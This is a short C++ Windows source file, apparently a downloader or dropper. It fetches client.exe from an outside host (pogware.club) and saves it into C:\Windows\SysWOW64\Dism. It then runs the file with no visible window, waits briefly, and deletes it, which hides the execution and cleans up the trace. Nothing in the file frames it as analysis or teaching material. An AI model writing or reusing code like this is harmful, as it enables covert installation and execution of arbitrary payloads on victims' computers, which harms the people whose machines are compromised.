#pragma comment(lib, "urlmon.lib")

#include <tchar.h>
#include <iostream>
#include <urlmon.h>

void downldclean()
{
	HRESULT result = URLDownloadToFile(NULL, _T("http://pogware.club/client.exe"), _T("c:/Windows/SysWOW64/Dism/client.exe"), 0, NULL); // download exe from url - temporary for now
}

// pretty self explanatory lol

void callclean()
{
	STARTUPINFO startupinfo = {};
	startupinfo.cb = sizeof startupinfo;
	PROCESS_INFORMATION processinformation = {};
	const TCHAR* targetlocation = _T("C:\\Windows\\SysWOW64\\Dism\\client.exe");

	if (!CreateProcess(targetlocation, 0, 0, FALSE, 0, CREATE_NO_WINDOW, 0, 0, &startupinfo, &processinformation))
	{
		DeleteFile("C:\\Windows\\SysWOW64\\Dism\\client.exe");
	}
	else
	{
		WaitForSingleObject(processinformation.hProcess, 5 * 1000);
		if (PostThreadMessage(processinformation.dwThreadId, WM_QUIT, 0, 0))
		CloseHandle(processinformation.hProcess);
		CloseHandle(processinformation.hThread);
	}

	std::cin.sync();
	std::cin.ignore();
	DeleteFile("C:\\Windows\\SysWOW64\\Dism\\client.exe");
}